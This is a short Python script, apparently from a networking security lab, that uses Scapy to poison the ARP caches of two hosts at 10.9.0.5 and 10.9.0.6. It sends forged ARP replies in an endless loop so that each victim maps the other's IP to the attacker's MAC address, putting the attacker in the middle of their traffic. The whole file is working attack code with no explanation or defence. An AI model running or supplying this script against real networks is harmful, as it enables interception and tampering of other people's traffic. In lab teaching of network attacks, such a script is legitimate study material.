from scapy.all import *

A_ip = "10.9.0.5"
B_ip = "10.9.0.6"

# Scapy automatically gets attacker's MAC
M_mac = get_if_hwaddr("eth0")
print("[*] Attacker MAC:", M_mac)

# Fake ARP replies:
# Tell A that B's IP belongs to attacker
arp_to_A = ARP(op=2, psrc=B_ip, pdst=A_ip, hwdst="ff:ff:ff:ff:ff:ff")

# Tell B that A's IP belongs to attacker
arp_to_B = ARP(op=2, psrc=A_ip, pdst=B_ip, hwdst="ff:ff:ff:ff:ff:ff")

print("[*] Sending spoofed ARP replies... (Ctrl+C to stop)")

while True:
    send(arp_to_A, verbose=False)
    send(arp_to_B, verbose=False)

